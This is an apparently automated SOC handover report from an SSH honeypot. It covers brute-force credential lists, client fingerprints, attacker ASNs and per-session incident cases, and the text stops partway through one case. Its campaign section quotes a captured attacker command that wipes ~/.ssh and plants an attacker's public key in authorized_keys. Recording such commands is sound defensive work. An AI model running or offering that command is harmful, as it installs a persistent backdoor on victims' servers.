# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T12:48:13Z |
| **Shift Time** | 12:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **122** |
| Confirmed Threats | **107** |
| False Positives Filtered | **15** (12.3%) |
| Unique Attacker IPs | **65** |
| Countries of Origin | **27** |
| High Severity Cases | **72** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **91** |
| Unique Credential Pairs | **48** |
| Unique Usernames | **14** |
| Unique Passwords | **48** |
| Successful Auth Pairs | **81** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `ubuntu` | 13 |
| `admin` | 9 |
| `support` | 8 |
| `centos` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin123456789` | 6 |
| `debian2018` | 5 |
| `config2019` | 5 |
| `support` | 4 |
| `support2013` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin123456789` | 6 |
| `debian` | `debian2018` | 5 |
| `config` | `config2019` | 5 |
| `support` | `support` | 4 |
| `support` | `support2013` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `debian` | `debian2018` | `122.170.100.253` | 2026-08-23T08:55:14 |
| `debian` | `debian2018` | `119.160.166.237` | 2026-08-23T08:55:23 |
| `ubuntu` | `P@ssw0rd123#` | `217.60.255.130` | 2026-08-23T08:59:01 |
| `root` | `!1ASDqweasdqwe` | `217.60.255.130` | 2026-08-23T08:59:05 |
| `centos` | `centos2019` | `121.202.146.144` | 2026-08-23T09:00:14 |
| `centos` | `centos2019` | `49.206.201.253` | 2026-08-23T09:00:19 |
| `centos` | `centos2019` | `62.148.236.52` | 2026-08-23T09:00:21 |
| `admin` | `admin2015` | `10.0.0.73` | 2026-08-23T09:01:49 |
| `debian` | `debian2018` | `10.0.0.73` | 2026-08-23T09:06:24 |
| `ubuntu` | `Info@2024` | `217.60.255.130` | 2026-08-23T09:08:33 |
| `root` | `!2#4%` | `217.60.255.130` | 2026-08-23T09:08:36 |
| `ubnt` | `ubnt2000` | `10.0.0.73` | 2026-08-23T09:15:01 |
| `ubuntu` | `123456aa` | `217.60.255.130` | 2026-08-23T09:18:11 |
| `root` | `qwe123` | `217.60.255.130` | 2026-08-23T09:18:14 |
| `admin` | `admin2015` | `124.160.255.180` | 2026-08-23T09:18:46 |
| `admin` | `admin2015` | `220.180.249.165` | 2026-08-23T09:19:02 |
| `debian` | `debian2018` | `218.25.233.22` | 2026-08-23T09:22:46 |
| `debian` | `debian2018` | `111.70.17.73` | 2026-08-23T09:22:55 |
| `support` | `support` | `176.53.159.196` | 2026-08-23T09:23:18 |
| `ubuntu` | `-1234567890` | `217.60.255.130` | 2026-08-23T09:27:38 |
| `admin` | `admin123456789` | `83.239.108.218` | 2026-08-23T09:27:39 |
| `root` | `Qwert123` | `217.60.255.130` | 2026-08-23T09:27:42 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-23T09:27:42 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-23T09:27:44 |
| `admin` | `admin123456789` | `196.189.124.229` | 2026-08-23T09:27:48 |
| `root` | `xa653e2ad77a4ac3994c5ada49d5d1f27` | `185.65.134.212` | 2026-08-23T09:28:01 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-23T09:29:54 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-23T09:29:55 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-23T09:30:04 |
| `ubnt` | `ubnt2000` | `2.184.236.166` | 2026-08-23T09:32:38 |
| `ubnt` | `ubnt2000` | `24.207.66.154` | 2026-08-23T09:32:45 |
| `unknown` | `123321` | `10.0.0.73` | 2026-08-23T09:34:07 |
| `unknown` | `123321` | `111.46.77.2` | 2026-08-23T09:35:43 |
| `root` | `root2024` | `114.111.54.189` | 2026-08-23T09:36:18 |
| `345gs5662d34` | `345gs5662d34` | `114.111.54.189` | 2026-08-23T09:36:22 |
| `root` | `3245gs5662d34` | `114.111.54.189` | 2026-08-23T09:36:23 |
| `ubuntu` | `123456789aA@` | `217.60.255.130` | 2026-08-23T09:37:18 |
| `root` | `Zz123456` | `217.60.255.130` | 2026-08-23T09:37:20 |
| `admin` | `admin123456789` | `10.0.0.73` | 2026-08-23T09:38:46 |
| `ubuntu` | `Password@2` | `217.60.255.130` | 2026-08-23T09:46:46 |
| `root` | `Bb12345678` | `217.60.255.130` | 2026-08-23T09:46:50 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T09:46:53 |
| `support` | `support2013` | `10.0.0.73` | 2026-08-23T09:47:23 |
| `admin` | `admin123456789` | `217.60.33.67` | 2026-08-23T09:55:20 |
| `admin` | `admin123456789` | `183.167.234.154` | 2026-08-23T09:55:28 |
| `ubuntu` | `woaini520` | `217.60.255.130` | 2026-08-23T09:56:34 |
| `root` | `letmein` | `217.60.255.130` | 2026-08-23T09:56:38 |
| `nobody` | `nobody2010` | `178.178.194.137` | 2026-08-23T10:00:10 |
| `support` | `support2013` | `65.20.196.154` | 2026-08-23T10:05:10 |
| `support` | `support2013` | `108.213.119.22` | 2026-08-23T10:05:23 |
| `support` | `support2013` | `194.31.8.12` | 2026-08-23T10:05:26 |
| `root` | `ny20EtALhp` | `10.0.0.73` | 2026-08-23T10:05:36 |
| `ubuntu` | `Aa.123456` | `217.60.255.130` | 2026-08-23T10:06:04 |
| `root` | `1q2w3e` | `217.60.255.130` | 2026-08-23T10:06:08 |
| `blank` | `blank123456789` | `188.43.204.45` | 2026-08-23T10:08:12 |
| `blank` | `blank123456789` | `65.20.217.64` | 2026-08-23T10:08:20 |
| `nobody` | `nobody2010` | `10.0.0.73` | 2026-08-23T10:11:20 |
| `ubuntu` | `)(*&^%$#@!` | `217.60.255.130` | 2026-08-23T10:15:40 |
| `root` | `Pa$$w0rd` | `217.60.255.130` | 2026-08-23T10:15:44 |
| `config` | `config2019` | `10.0.0.73` | 2026-08-23T10:20:00 |
| `blank` | `blank123456789` | `31.173.8.170` | 2026-08-23T10:23:31 |
| `blank` | `blank123456789` | `36.137.38.119` | 2026-08-23T10:23:44 |
| `ubuntu` | `System@1234` | `217.60.255.130` | 2026-08-23T10:25:05 |
| `root` | `ADMINISTRATOR@1234` | `217.60.255.130` | 2026-08-23T10:25:09 |
| `nobody` | `nobody2010` | `82.67.175.124` | 2026-08-23T10:27:45 |
| `user` | `user2024` | `176.204.246.98` | 2026-08-23T10:32:44 |
| `user` | `user2024` | `196.188.93.169` | 2026-08-23T10:32:52 |
| `ubuntu` | `12345abcde` | `217.60.255.130` | 2026-08-23T10:34:40 |
| `root` | `Abcd12345` | `217.60.255.130` | 2026-08-23T10:34:44 |
| `config` | `config2019` | `37.46.160.175` | 2026-08-23T10:37:29 |
| `config` | `config2019` | `62.201.212.54` | 2026-08-23T10:37:36 |
| `config` | `config2019` | `195.158.26.59` | 2026-08-23T10:37:43 |
| `config` | `config2019` | `125.139.124.120` | 2026-08-23T10:37:52 |
| `centos` | `centos2013` | `10.0.0.73` | 2026-08-23T10:39:11 |
| `centos` | `centos2013` | `178.224.53.154` | 2026-08-23T10:40:43 |
| `user` | `user2024` | `10.0.0.73` | 2026-08-23T10:43:59 |
| `ubuntu` | `P@ssw0rd!@#$%` | `217.60.255.130` | 2026-08-23T10:44:10 |
| `root` | `adm1n` | `217.60.255.130` | 2026-08-23T10:44:15 |
| `test` | `test123456789` | `10.0.0.73` | 2026-08-23T10:52:31 |
| `ubuntu` | `Dialog@123` | `217.60.255.130` | 2026-08-23T10:53:42 |
| `root` | `datacenter` | `217.60.255.130` | 2026-08-23T10:53:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **122** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| OpenSSH | 32 |
| Paramiko (Python) | 8 |
| Go SSH scanner | 8 |
| AsyncSSH (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 32 | 32 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `0a07365cc01f...` | Generic scanner | 5 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 32 | 32 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `0a07365cc01f...` | Go SSH scanner | 5 | 1 | Generic scanner |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `6bad18ef8256...` | AsyncSSH (Python) | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `114.111.54.189`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **65** |
| Unique ASNs | **54** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS1257` | Tele2 Sverige AB | 2 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (72)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e4829b677f0c

| Field | Detail |
|---|---|
| **Source IP** | `122.170.100[.]253` |
| **First Seen** | 2026-08-23 08:55 |
| **Last Seen** | 2026-08-23 08:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:55:12` | `cowrie.session.connect` |
| `2026-08-23 08:55:12` | `cowrie.client.version` |
| `2026-08-23 08:55:12` | `cowrie.client.kex` |
| `2026-08-23 08:55:14` | `cowrie.login.success` |
| `2026-08-23 08:55:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.100[.]253` to AbuseIPDB if not already reported
- [ ] Block `122.170.100[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d341aa4880

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-08-23 08:55 |
| **Last Seen** | 2026-08-23 08:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:55:20` | `cowrie.session.connect` |
| `2026-08-23 08:55:20` | `cowrie.client.version` |
| `2026-08-23 08:55:20` | `cowrie.client.kex` |
| `2026-08-23 08:55:23` | `cowrie.login.success` |
| `2026-08-23 08:55:23` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff15504570a1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:59 |
| **Last Seen** | 2026-08-23 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:59:00` | `cowrie.session.connect` |
| `2026-08-23 08:59:00` | `cowrie.client.version` |
| `2026-08-23 08:59:00` | `cowrie.client.kex` |
| `2026-08-23 08:59:01` | `cowrie.login.success` |
| `2026-08-23 08:59:01` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:59:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:59:02` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30d347889bb3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 08:59 |
| **Last Seen** | 2026-08-23 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 08:59:04` | `cowrie.session.connect` |
| `2026-08-23 08:59:04` | `cowrie.client.version` |
| `2026-08-23 08:59:04` | `cowrie.client.kex` |
| `2026-08-23 08:59:05` | `cowrie.login.success` |
| `2026-08-23 08:59:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 08:59:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 08:59:05` | `cowrie.direct-tcpip.data` |
| `2026-08-23 08:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d57cf23573b

| Field | Detail |
|---|---|
| **Source IP** | `121.202.146[.]144` |
| **First Seen** | 2026-08-23 09:00 |
| **Last Seen** | 2026-08-23 09:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:00:03` | `cowrie.session.connect` |
| `2026-08-23 09:00:06` | `cowrie.client.version` |
| `2026-08-23 09:00:06` | `cowrie.client.kex` |
| `2026-08-23 09:00:14` | `cowrie.login.success` |
| `2026-08-23 09:00:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.146[.]144` to AbuseIPDB if not already reported
- [ ] Block `121.202.146[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e342d41f4cdd

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-08-23 09:00 |
| **Last Seen** | 2026-08-23 09:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:00:17` | `cowrie.session.connect` |
| `2026-08-23 09:00:18` | `cowrie.client.version` |
| `2026-08-23 09:00:18` | `cowrie.client.kex` |
| `2026-08-23 09:00:19` | `cowrie.login.success` |
| `2026-08-23 09:00:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-838e1f64f262

| Field | Detail |
|---|---|
| **Source IP** | `62.148.236[.]52` |
| **First Seen** | 2026-08-23 09:00 |
| **Last Seen** | 2026-08-23 09:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:00:20` | `cowrie.session.connect` |
| `2026-08-23 09:00:20` | `cowrie.client.version` |
| `2026-08-23 09:00:20` | `cowrie.client.kex` |
| `2026-08-23 09:00:21` | `cowrie.login.success` |
| `2026-08-23 09:00:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.148.236[.]52` to AbuseIPDB if not already reported
- [ ] Block `62.148.236[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d634f219be

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:08 |
| **Last Seen** | 2026-08-23 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:08:32` | `cowrie.session.connect` |
| `2026-08-23 09:08:32` | `cowrie.client.version` |
| `2026-08-23 09:08:32` | `cowrie.client.kex` |
| `2026-08-23 09:08:33` | `cowrie.login.success` |
| `2026-08-23 09:08:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:08:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:08:33` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51aa6b87cdaa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:08 |
| **Last Seen** | 2026-08-23 09:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:08:35` | `cowrie.session.connect` |
| `2026-08-23 09:08:35` | `cowrie.client.version` |
| `2026-08-23 09:08:35` | `cowrie.client.kex` |
| `2026-08-23 09:08:36` | `cowrie.login.success` |
| `2026-08-23 09:08:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:08:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:08:37` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e36d8863de2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:18 |
| **Last Seen** | 2026-08-23 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:18:10` | `cowrie.session.connect` |
| `2026-08-23 09:18:10` | `cowrie.client.version` |
| `2026-08-23 09:18:10` | `cowrie.client.kex` |
| `2026-08-23 09:18:11` | `cowrie.login.success` |
| `2026-08-23 09:18:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:18:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:18:11` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f19da5b84a5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 09:18 |
| **Last Seen** | 2026-08-23 09:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:18:13` | `cowrie.session.connect` |
| `2026-08-23 09:18:13` | `cowrie.client.version` |
| `2026-08-23 09:18:13` | `cowrie.client.kex` |
| `2026-08-23 09:18:14` | `cowrie.login.success` |
| `2026-08-23 09:18:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:18:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:18:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917c534c4ca3

| Field | Detail |
|---|---|
| **Source IP** | `124.160.255[.]180` |
| **First Seen** | 2026-08-23 09:18 |
| **Last Seen** | 2026-08-23 09:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:18:41` | `cowrie.session.connect` |
| `2026-08-23 09:18:42` | `cowrie.client.version` |
| `2026-08-23 09:18:42` | `cowrie.client.kex` |
| `2026-08-23 09:18:46` | `cowrie.login.success` |
| `2026-08-23 09:18:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.255[.]180` to AbuseIPDB if not already reported
- [ ] Block `124.160.255[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcec5c95fced

| Field | Detail |
|---|---|
| **Source IP** | `220.180.249[.]165` |
| **First Seen** | 2026-08-23 09:18 |
| **Last Seen** | 2026-08-23 09:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:18:57` | `cowrie.session.connect` |
| `2026-08-23 09:18:59` | `cowrie.client.version` |
| `2026-08-23 09:18:59` | `cowrie.client.kex` |
| `2026-08-23 09:19:02` | `cowrie.login.success` |
| `2026-08-23 09:19:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `220.180.249[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3a77e997cc

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-08-23 09:22 |
| **Last Seen** | 2026-08-23 09:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:22:43` | `cowrie.session.connect` |
| `2026-08-23 09:22:44` | `cowrie.client.version` |
| `2026-08-23 09:22:44` | `cowrie.client.kex` |
| `2026-08-23 09:22:46` | `cowrie.login.success` |
| `2026-08-23 09:22:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ce3203afca0

| Field | Detail |
|---|---|
| **Source IP** | `111.70.17[.]73` |
| **First Seen** | 2026-08-23 09:22 |
| **Last Seen** | 2026-08-23 09:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:22:52` | `cowrie.session.connect` |
| `2026-08-23 09:22:53` | `cowrie.client.version` |
| `2026-08-23 09:22:53` | `cowrie.client.kex` |
| `2026-08-23 09:22:55` | `cowrie.login.success` |
| `2026-08-23 09:22:55` | `cowrie.direct-tcpip.request` |
